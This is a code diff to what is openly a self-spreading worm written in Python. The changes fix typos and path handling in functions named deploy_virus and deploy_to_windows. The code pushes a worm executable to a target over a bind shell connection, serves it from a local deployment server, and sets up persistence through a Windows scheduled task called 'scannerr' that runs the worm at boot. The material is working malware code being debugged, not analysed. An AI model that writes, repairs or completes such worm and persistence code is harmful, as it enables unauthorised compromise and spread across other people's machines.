@@ -21,8 +21,9 @@ class tunnel(threading.Thread):
         conn.settimeout(10)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        dir = "\\Users\Public\\"
-        self.deploy_virus(self.worm.getfiledata(),conn, dir)
+        dir = "/Users/Public/"
+        osplatform = "windows"
+        self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
         self.create_persistence(conn, dir)
         conn.close()
     
@@ -106,18 +107,18 @@ class tunnel(threading.Thread):
         print("Create a Schedule Tasks to Start the Bind Shell on Boot")
         print(self.get_response(conn,1024))
     
-    def deploy_virus(self, data, conn, ostype="windows"):
+    def deploy_virus(self, data, conn, ostype="windows", dir=""):
         #print(data)
         server = deployment("0.0.0.0",8081,data)
         server.start()
         
         if ostype=="windows":
-            self.depoly_to_windows(conn)
+            self.deploy_to_windows(conn, dir)
         else:
             self.deploy_to_linux(conn)
             
             
-    def depoly_to_windows(self,conn, dir):
+    def deploy_to_windows(self,conn, dir):
         #start command sequence
         try:
             print("Start Deploying worm to Windows")
@@ -156,7 +157,7 @@ class tunnel(threading.Thread):
             print("Target Response: {}".format(self.get_response(conn,1024)))
             
             #Setup Self execute on startup
-            command = 'schtasks /create /tn "scannerr" /tr "C:{}{}_tworm.exe" /sc onstart'.format(dir,self.lhost).encode()
+            command = 'schtasks /create /tn "scannerr" /tr "C://{}{}_tworm.exe" /sc onstart'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
@@ -165,7 +166,7 @@ class tunnel(threading.Thread):
             print("no Response")
             
             
-    def depoly_to_linux(self, conn):
+    def deploy_to_linux(self, conn):
         pass        
     
     
